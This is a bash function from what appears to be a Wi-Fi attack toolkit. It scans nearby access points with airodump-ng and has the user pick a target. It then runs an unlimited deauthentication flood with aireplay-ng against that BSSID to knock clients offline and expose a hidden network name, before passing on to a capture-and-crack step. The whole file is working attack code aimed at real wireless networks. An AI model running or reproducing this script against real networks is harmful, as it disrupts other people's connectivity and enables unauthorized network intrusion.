
function ataqueAccessPointOculto() {
	Ver_Pckg_Tools
	Ver_Mon_WCar_Fun
	if [ "$VerMon" != "" ]; then
		Ver_Mon_Fun
		for ((c = 0; c <= 3; c++)); do
			echo -ne "\r[00:${Green}0${c}$White]$White Click$Green CTRL+C$White when you see your target,good luck"
			sleep 1
		done
		Ver_Dir=$(ls /tmp/HT-WPS-Breaker | grep -E '^capture$')
		if [ "$Ver_Dir" != "" ]; then
			rm -rf ${Temporary}/capture
			mkdir ${Temporary}/capture
		else
			mkdir ${Temporary}/capture
		fi
		trap - SIGINT SIGQUIT SIGTSTP
		airodump-ng -w ${Temporary}/capture/capture --output-format csv -a $mon
		Line_CSV=$(wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}')
		HeTa=$(cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}')
		HeTa=$(expr $HeTa - 1)
		head -n $HeTa ${Temporary}/capture/capture-01.csv &>${Temporary}/capture/capture-02.csv
		tail -n +$HeTa ${Temporary}/capture/capture-01.csv &>${Temporary}/capture/clients.csv
		back=0
		trap exit_function SIGINT
		echo -ne '\033c'
		echo -e "$Red+---------------------------------------------------------------------------------------+"
		echo -e "| [+]$White If the BSSID in$BGreen green$White that means there are clients connected to device.$Red           |"
		echo -e "| [+]$White If the BSSID in$BYellow yellow$White that means there are clients connected to device or aren't.$Red|"
		echo -e "+---------------------------------------------------------------------------------------+$White"
		echo -e ${Yellow}"  ID	${BWhite}BSSID            	 CH	SEC     PWR     CLIENT   ESSID"
		echo -e $Purple" ~~~~   ~~~~~                    ~~     ~~~     ~~~     ~~~~~~   ~~~~~"
		i=0
		while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
			v=0
			length=${#MAC}
			PRIVACY=$(echo $PRIVACY | tr -d "^ ")
			PRIVACY=${PRIVACY:0:4}
			if [ $length -ge 17 ]; then
				i=$(($i + 1))
				if [ $i != 0 ]; then
					d=1
				else
					d=0
				fi
				POWER=$(expr $POWER + 100)
				CLIENT=$(cat ${Temporary}/capture/clients.csv | grep $MAC)
				Ver_vun=$(echo $MAC | cut -c 1-8)
				if [ "$CLIENT" != "" ]; then
					CLIENT="Yes"
				else
					CLIENT="No"
				fi
				if [ "$i" -lt "10" ]; then
					echo -e -n " ${Red}[${Yellow}0"$i"${Red}]\t"
				else
					echo -e -n " ${Red}[${Yellow}"$i"${Red}]\t"
				fi
				if [ "$CLIENT" == "Yes" ]; then
					echo -e -n $BGreen"$MAC\t"
				else
					echo -e -n $BYellow"$MAC\t"
				fi
				echo -e -n $BWhite"$CHANNEL\t"
				echo -e -n $BWhite"$PRIVACY\t"
				if [ $POWER -ge 40 ]; then
					echo -e -n $Green"$POWER%\t"
				elif [ $POWER -ge 30 ]; then
					echo -e -n $Yellow"$POWER%\t"
				else
					echo -e -n $Red"$POWER%\t"
				fi
				if [ "$CLIENT" == "Yes" ]; then
					echo -e -n $Green"$CLIENT\t"
				else
					echo -e -n $Red"$CLIENT\t"
				fi
				echo -e $BWhite"$ESSID\t"
				IDLENGTH=$IDLENGTH
				ESSID[$i]=$ESSID
				CHANNEL[$i]=$CHANNEL
				BSSID[$i]=$MAC
				PRIVACY[$i]=$PRIVACY
				SPEED[$i]=$SPEED
			fi
		done <${Temporary}/capture/capture-02.csv
		echo ""
		if [ "$i" -eq "0" ]; then
			exit_function
		fi
		echo ""
		V_number=0
		while [ "$V_number" != "1" ]; do
			echo -en "\033[1A\033[2K"
			echo -n -e "${White}  [+]${Blue} Select the ${Red}ID${Blue} of your target from$White [${Green}${d}-${i}$White] : "
			read N_OB
			if [[ "$N_OB" =~ ^[+-]?[0-9]+$ ]]; then
				if [ "$N_OB" -ge "$d" ] && [ "$N_OB" -le "$i" ]; then
					V_number=1
				else
					V_number=0
				fi
			else
				V_number=0
			fi
		done
		echo ""
		trap - SIGINT SIGQUIT SIGTSTP
		idlenght=${IDLENGTH[$N_OB]}
		CHANNEL=$(echo ${CHANNEL[$N_OB]} | tr -d [:space:])
		BSSID=${BSSID[$N_OB]}
		rm -rf ${Temporary}/capture/*
		echo ""
		echo -e "${White}  +${Yellow}------------------------------${White}+"
		echo -e "${Yellow}  |${White} [${Red}+${White}]$Yellow all required arguments${Yellow}   |"
		echo -e "${White}  +${Yellow}------------------------------${White}+"
		echo ""
		trap kill_Hidden SIGINT
		airodump-ng -w ${Temporary}/capture/capture --output-format csv -c $CHANNEL -a $mon 2>/dev/null &
		Airodump_PID=$!
		disown $Airodump_PID
		tset
		aireplay-ng -0 0 -a $BSSID $mon >/dev/null 2>/dev/null &
		aireplayID=$!
		disown $aireplayID
		Quit=0
		while [ $Quit == 0 ]; do
			Hidden=$(cat ${Temporary}/capture/capture-01.csv 2>/dev/null | grep ${BSSID} | cut -d',' -f14)
			Ver_Name=$(echo -e $Hidden)
			if [ "$Ver_Name" != "" ]; then
				echo ""
				echo -en "\033[1A\033[2K"
				echo -ne "${Yellow}          >>${White} The name has been obtained${Green} successfully ${White}."
				Quit=1
			else
				echo -ne "\r${Yellow}          >>${White} The name of${Green} AP${White} is still {${Red} Hidden${White} } ."
				Quit=0
			fi
		done
		trap exit_function SIGINT
		kill -9 $aireplayID 2>/dev/null
		kill -9 $Airodump_PID 2>/dev/null
		sleep 2.0
		Line_CSV=$(wc -l ${Temporary}/capture/capture-01.csv | awk '{print $1}')
		HeTa=$(cat ${Temporary}/capture/capture-01.csv | egrep -a -n '(Station|CLIENT)' | awk -F : '{print $1}')
		HeTa=$(expr $HeTa - 1)
		head -n $HeTa ${Temporary}/capture/capture-01.csv &>${Temporary}/capture/capture-02.csv
		tail -n +$HeTa ${Temporary}/capture/capture-01.csv &>${Temporary}/capture/clients.csv
		SELECT_CAPTURE_CRACK
	fi
}
